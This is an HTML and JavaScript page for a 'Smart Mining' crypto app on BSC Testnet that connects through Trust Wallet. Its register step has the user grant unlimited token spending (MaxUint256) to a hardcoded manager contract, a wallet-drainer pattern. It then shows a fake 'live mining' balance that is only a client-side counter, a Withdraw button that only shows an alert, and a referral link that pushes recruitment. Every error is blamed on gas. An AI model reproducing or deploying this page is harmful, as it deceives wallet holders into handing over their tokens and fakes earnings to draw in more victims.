<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Mining BSC Testnet</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    
    <style>
        :root {
            --bg: #0f172a;
            --card: #1e293b;
            --primary: #38bdf8;
            --accent: #818cf8;
            --text: #f8fafc;
            --success: #22c55e;
        }

        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; transition: 0.5s; }
        .dark-mode { background: var(--bg); color: var(--text); }
        
        .card { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; transition: 0.5s; }
        .dark-mode .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); color: white; }

        .btn { padding: 15px; font-size: 16px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .trust-btn { background: #3375bb; color: white; }
        .copy-btn { background: #eeeeee; color: #333; font-size: 12px; }
        
        #loginView, #dashboardView, #miningView { display: none; }
        
        /* Mining Dashboard Styles */
        .mining-circle { width: 140px; height: 140px; margin: 15px auto; border-radius: 50%; border: 4px dashed var(--primary); display: flex; flex-direction: column; justify-content: center; align-items: center; animation: spin 10s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .inner-val { animation: spin-rev 10s linear infinite; }
        @keyframes spin-rev { 100% { transform: rotate(-360deg); } }

        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .stat-item { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); }
        
        .ref-box { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; font-size: 11px; margin-top: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #444; }
        .timer-bg { width: 100%; height: 6px; background: #334155; border-radius: 10px; margin-top: 10px; overflow: hidden; }
        .timer-fill { height: 100%; background: var(--success); width: 0%; transition: 1s; }
        
        .withdraw-btn { background: linear-gradient(90deg, #38bdf8, #818cf8); color: white; }
        .status { font-size: 12px; color: #ff9800; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div id="loginView" style="display: block;">
        <h2 style="color: #3375bb;">BSC Testnet Login</h2>
        <p style="font-size: 14px; color: #666;">Start your test mining node (Chain ID: 97)</p>
        <button class="btn trust-btn" onclick="openTrust()">Open Trust Wallet</button>
        <button class="btn copy-btn" onclick="copyLink()">Copy Link (Manual Paste)</button>
        <p id="msg" class="status"></p>
    </div>

    <div id="dashboardView">
        <h2 style="color: #2196F3;">Registration</h2>
        <p style="font-size: 13px;">Wallet Connected to Testnet. Ready to Register?</p>
        <p id="addr" style="font-size: 9px; background: #f9f9f9; padding: 10px; border-radius: 8px; color: #333;"></p>
        <button id="regBtn" class="btn" style="background: #4CAF50; color: white;" onclick="register()">Approve & Register (Test BNB)</button>
    </div>

    <div id="miningView">
        <div class="mining-circle">
            <div class="inner-val">
                <small style="font-size: 10px; opacity: 0.8;">LIVE MINING</small>
                <div id="liveBalance" style="font-size: 20px; font-weight: bold; color: var(--primary);">$1.00000</div>
            </div>
        </div>

        <div class="stat-grid">
            <div class="stat-item">
                <small>Rate</small><br><strong>1% / Hour</strong>
            </div>
            <div class="stat-item">
                <small>Countdown</small><br><strong id="timerText">59:59</strong>
            </div>
        </div>
        <div class="timer-bg"><div id="timerFill" class="timer-fill"></div></div>

        <div style="text-align: left; margin-top: 15px;">
            <small style="color: #94a3b8;">Referral Link</small>
            <div class="ref-box">
                <span id="refLink">loading...</span>
                <b style="color: var(--primary); cursor: pointer;" onclick="copyRef()">COPY</b>
            </div>
        </div>

        <button class="btn withdraw-btn" onclick="alert('Withdrawal requires min $2 (Testnet Mode)')">Withdraw</button>
        <p onclick="location.reload()" style="color: #ef4444; font-size: 12px; cursor: pointer; margin-top: 20px;">Logout Session</p>
    </div>
</div>

<script>
    const TESTNET_CHAIN_ID = 97; 
    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    let signer;
    let balance = 1.00000;

    function openTrust() {
        const url = window.location.href;
        window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
        document.getElementById('msg').innerText = "Opening Trust Wallet... Ensure it is on BSC Testnet.";
    }

    function copyLink() {
        navigator.clipboard.writeText(window.location.href);
        alert("Link Copied! Trust Wallet Browser mein paste karein.");
    }

    async function init() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                
                // Network Detection
                const { chainId } = await provider.getNetwork();
                if (chainId !== TESTNET_CHAIN_ID) {
                    document.getElementById('msg').innerText = "Alert: Switch to BSC Testnet (ID 97) in Wallet Settings!";
                    return;
                }

                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();

                document.getElementById('loginView').style.display = 'none';
                document.getElementById('dashboardView').style.display = 'block';
                document.getElementById('addr').innerText = address;
                document.getElementById('msg').innerText = "";
            } catch (e) { console.error(e); }
        }
    }

    setInterval(() => { if (window.ethereum && !signer) init(); }, 2000);
    window.onload = init;

    async function register() {
        const btn = document.getElementById('regBtn');
        try {
            btn.innerText = "Processing Transaction...";
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);

            // Step 1: Approve (Using Test BNB)
            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256);
            await tx1.wait();

            // Step 2: Register
            const tx2 = await mCon.register();
            await tx2.wait();

            startDashboard();
        } catch (e) {
            alert("Error: Inadequate Gas Fee! Get free tBNB from Faucet.");
            btn.innerText = "Approve & Register (Test BNB)";
        }
    }

    function startDashboard() {
        document.body.classList.add('dark-mode');
        document.getElementById('dashboardView').style.display = 'none';
        document.getElementById('miningView').style.display = 'block';

        const addr = document.getElementById('addr').innerText;
        document.getElementById('refLink').innerText = window.location.origin + "/?ref=" + addr.substring(0,6);

        // Balance Counter Animation
        setInterval(() => {
            balance += (0.01 / 3600); 
            document.getElementById('liveBalance').innerText = "$" + balance.toFixed(5);
        }, 1000);

        // Countdown Timer logic
        let sec = 3600;
        setInterval(() => {
            sec--;
            if(sec <= 0) sec = 3600;
            let m = Math.floor(sec / 60);
            let s = sec % 60;
            document.getElementById('timerText').innerText = (m<10?'0':'')+m + ":" + (s<10?'0':'')+s;
            document.getElementById('timerFill').style.width = ((3600-sec)/3600*100) + "%";
        }, 1000);
    }

    function copyRef() {
        navigator.clipboard.writeText(document.getElementById('refLink').innerText);
        alert("Referral Link Copied!");
    }
</script>
</body>
</html>
